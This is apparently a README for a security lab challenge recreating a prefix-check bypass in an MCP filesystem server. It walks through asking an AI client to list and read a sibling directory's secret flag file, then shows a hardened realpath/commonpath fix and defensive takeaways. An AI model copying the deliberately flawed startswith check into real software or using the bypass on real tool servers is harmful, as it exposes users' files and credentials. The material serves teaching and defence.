# Challenge 02: Filesystem Prefix Bypass (CVE-2025-53110)
https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/

The Anthropic/Cymulate “EscapeRoute” disclosure (CVE-2025-53110, CVSS 7.3) exposed a directory-containment flaw in early MCP filesystem servers. They attempted to confine tools to `/app/files/safe_files` by using a naive `startswith` check. A colliding path such as `/app/files/safe_files_sensitive` passes that check, giving an attacker full read access to hidden files. This challenge recreates that behavior so you can prove the exploit and compare it with a hardened implementation.

## Vulnerability
`vulnerable/server.py` defines `ALLOWED_DIR = "/app/files/safe_files"` and the `list_directory_contents` tool simply verifies `full_path.startswith(ALLOWED_DIR)` before calling `os.listdir`. Because the check never resolves the real filesystem path, any sibling directory that shares the prefix is treated as “allowed”. The repo ships two directories:

- `/app/files/safe_files/manifest.txt` – legitimate operator files.
- `/app/files/safe_files_sensitive/secret.txt` – the red-team flag that *must* remain hidden.

By requesting `/app/files/safe_files_sensitive` the attacker leaks `secret.txt` even though it is meant to be outside the policy.

## Real-World Impact

**Severity: CVSS 7.3 (High)** - This vulnerability allows authenticated attackers to bypass directory containment controls and access sensitive files outside the intended scope.

**Business Impact**:
- **Data Exposure**: Attackers can discover and read sensitive files (credentials, API keys, customer data, source code)
- **Attack Chain Enabler**: Directory listing reveals file structure for planning further attacks
- **Compliance Violations**: Unauthorized access to regulated data (PII, PHI, financial records)
- **Lateral Movement**: Exposed configuration files may contain credentials for other systems

**In the Anthropic/Cymulate "EscapeRoute" disclosure**, this vulnerability could have allowed:
- Listing contents of directories containing API keys and deployment secrets
- Combining with file read operations to exfiltrate credentials
- Enumerating filesystem structure to identify high-value targets

## Exploit Walkthrough (Cursor/Claude Desktop)

### Step 1: Launch the Vulnerable Server
```bash
docker compose up filesystem-bypass-prefix-vulnerable
```
Server runs at `http://localhost:8002/mcp/stream`

### Step 2: Connect Your MCP Client
In Cursor or Claude Desktop, configure the MCP server connection:
```json
{
  "mcpServers": {
    "challenge-02-vulnerable": {
      "url": "http://localhost:8002/mcp/stream"
    }
  }
}
```

### Step 3: Discover Available Tools
Ask the AI: *"What MCP tools are available?"*

Expected response:
- `list_directory_contents(full_path: str)` - Lists directory contents within allowed paths
- `read_file_contents(file_path: str)` - Reads file contents

### Step 4: Exploit the Prefix Bypass
**Attack 1 - Directory Enumeration**:

Ask the AI: *"List the contents of `/app/files/safe_files_sensitive`"*

The AI invokes:
```json
{
  "tool": "list_directory_contents",
  "arguments": {
    "full_path": "/app/files/safe_files_sensitive"
  }
}
```

Vulnerable server returns:
```
Listing for /app/files/safe_files_sensitive:
secret.txt
```

✅ **Success!** The sibling directory `safe_files_sensitive` was accessed because it shares the prefix `safe_files` - the naive `startswith()` check passed.

**Attack 2 - Data Exfiltration**:

Ask the AI: *"Read the contents of `/app/files/safe_files_sensitive/secret.txt`"*

The AI invokes:
```json
{
  "tool": "read_file_contents",
  "arguments": {
    "file_path": "/app/files/safe_files_sensitive/secret.txt"
  }
}
```

Vulnerable server returns:
```
FLAG{cve_2025_53110_escape_route}
```

✅ **Full compromise!** Combined directory listing with file read to exfiltrate sensitive data.

### Step 5: Test Against Secure Server
Connect to `http://localhost:9002/mcp/stream` and repeat the exploit.

Secure server response:
```
Access denied.
```

✅ **Mitigated!** Path canonicalization and containment validation block the attack.

## Secure Fix
`secure/server.py` patches the flaw with the containment check recommended in the CVE:

```diff
-    if not full_path.startswith(ALLOWED_DIR):
-        return f"Access denied: {full_path} is outside {ALLOWED_DIR}"
+    real_allowed_dir = os.path.realpath(ALLOWED_DIR)
+    real_target = os.path.realpath(full_path)
+    if os.path.commonpath([real_allowed_dir, real_target]) != real_allowed_dir:
+        return "Access denied."
```

### How the Fix Works

**Primary Defense (CVE-2025-53110 Fix)**:
- `os.path.realpath()` - Canonicalizes paths by resolving `..`, symlinks, and relative segments to get the actual filesystem location
- `os.path.commonpath()` - Verifies the resolved target path is truly inside the allowed directory, not just sharing a prefix
- Rejects colliding prefixes like `/app/files/safe_files_sensitive` that would pass naive `startswith()` checks

**Additional Security Improvements**:
- Returns consistent "Access denied" messages without leaking path information
- Validates input (non-empty strings, proper types)
- Checks for symlinks to prevent symlink-based directory escapes

### Example Behavior

| Request Path | Vulnerable Result | Secure Result |
|-------------|------------------|---------------|
| `/app/files/safe_files` | ✅ Lists `manifest.txt` | ✅ Lists `manifest.txt` |
| `/app/files/safe_files_sensitive` | ❌ Lists `secret.txt` (BYPASS) | ✅ "Access denied" |
| `/app/files/safe_files/../safe_files_sensitive` | ❌ Lists `secret.txt` | ✅ "Access denied" |
| `/etc/passwd` | ✅ "Access denied" | ✅ "Access denied" |

## Defensive Takeaways

1. **Never trust string prefix checks for path security** - `startswith()` is a string operation, not a filesystem security boundary. Always canonicalize paths before validation.

2. **Use os.path.realpath() for path canonicalization** - This resolves symlinks, `..`, and relative path components to get the actual filesystem location. Without this, attackers can use symbolic links or path traversal to escape containment.

3. **Validate containment with os.path.commonpath()** - After canonicalization, verify the resolved path shares a common prefix with the allowed directory at the filesystem level, not just as strings.

4. **Return consistent error messages** - Don't leak path information in error responses. The vulnerable version returns `f"Access denied: {full_path} is outside {ALLOWED_DIR}"` which reveals the allowed directory structure to attackers. Always return generic "Access denied" messages.

5. **Validate input format strictly** - Check for empty strings, correct types, and strip whitespace before processing. Invalid input should fail fast.

6. **Protect against symlink attacks** - Symlinks can bypass path restrictions even after canonicalization. Check `is_symlink()` and refuse to operate on symbolic links that could point outside the allowed directory.

7. **Defense-in-depth approach** - Layer multiple controls: input validation + path canonicalization + containment checks + symlink detection + consistent errors. If one layer fails, others still protect you.

8. **Log security-relevant events** - Path traversal attempts, symlink access, and containment violations should be logged with sufficient context for security monitoring and incident response.

This challenge demonstrates how subtle filesystem API misuse can lead to directory traversal vulnerabilities. The difference between `startswith()` (string comparison) and proper path validation (`realpath()` + `commonpath()`) is the difference between secure and exploitable code.


